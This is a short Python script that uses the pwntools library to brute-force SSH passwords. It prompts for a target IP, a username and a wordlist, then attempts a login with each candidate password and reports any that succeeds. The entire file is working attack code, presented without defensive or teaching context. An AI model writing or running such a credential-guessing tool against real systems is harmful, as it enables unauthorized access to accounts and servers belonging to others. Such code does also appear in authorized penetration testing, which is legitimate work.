#!/usr/bin/python3
from pwn import *  # pwntools library for exploit development

# Get user input for target details
host = input("Enter the target IP>> ")
username = input("Target Username: ")
word_list = input("Enter the path to word list>> ")

# Initialize attempts counter
attempts = 0

# Open the wordlist file for brute-force attack
with open(word_list, "r") as passwords_list:
    for password in passwords_list:
        password = password.strip("\n")  # Remove newline characters and spaces

        # Attempt connection using the current password
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))

            # Using pwntools ssh module to attempt connection
            response = ssh(host=host, user=username, password=password, timeout=2)

            # If connected, print the valid password and exit
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break  # Exit loop after finding a valid password

            response.close()
        except:
            print("[+] Invalid password!!")

        # Increment attempts counter
        attempts += 1
